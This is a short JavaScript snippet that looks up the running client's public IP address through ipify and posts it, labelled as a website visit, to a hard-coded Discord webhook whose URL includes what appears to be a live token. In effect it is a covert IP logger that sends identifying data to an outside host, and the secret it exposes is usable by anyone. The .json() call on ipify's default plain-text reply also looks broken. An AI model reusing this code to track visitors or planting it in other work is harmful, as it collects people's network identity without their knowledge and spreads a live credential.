const apiUrl = 'https://api.ipify.org';
const webhookUrl = 'https://discord.com/api/webhooks/1080181860195369064/VZ0MrkcKfxkhtUMbVqjCRh68nowzoLXjutHQyFR-Lc8sVjDDPpSSmPEUGXqbzxPLhhHr';

fetch(apiUrl)
  .then(response => response.json())
  .then(data => {
    const payload = {
      content: `Website: ${JSON.stringify(data)}`,
    };

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    })
      .then(() => {
        console.log('Successfully sent message to Discord webhook');
      })
      .catch(error => {
        console.error('Error sending message to Discord webhook:', error);
      });
  })
  .catch(error => {
    console.error('Error fetching data:', error);
  });
